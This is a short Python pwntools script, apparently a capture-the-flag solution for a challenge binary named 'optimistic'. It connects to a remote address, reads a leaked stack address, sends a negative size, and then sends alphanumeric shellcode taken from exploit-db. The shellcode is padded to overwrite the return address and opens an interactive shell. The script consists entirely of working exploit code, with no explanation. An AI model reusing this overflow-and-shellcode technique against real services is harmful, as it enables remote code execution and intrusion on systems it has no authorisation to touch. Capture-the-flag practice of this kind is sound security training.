from pwn import *

context.binary = exe = ELF('optimistic')

#io = process()
io = remote('142.93.32.153', 30080)

io.sendlineafter(b': ', b'y')
io.recvuntil(b'0x')
rbp = int(io.recvline(False), 16)
io.sendlineafter(b': ', b'a')
io.sendlineafter(b': ', b'a')
io.sendlineafter(b': ', b'-100')

# alphanumeric shellcode: https://www.exploit-db.com/exploits/35205
payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'.ljust(0x68, b'A') + p64(rbp-0x60)
io.sendlineafter(b': ', payload)
io.interactive()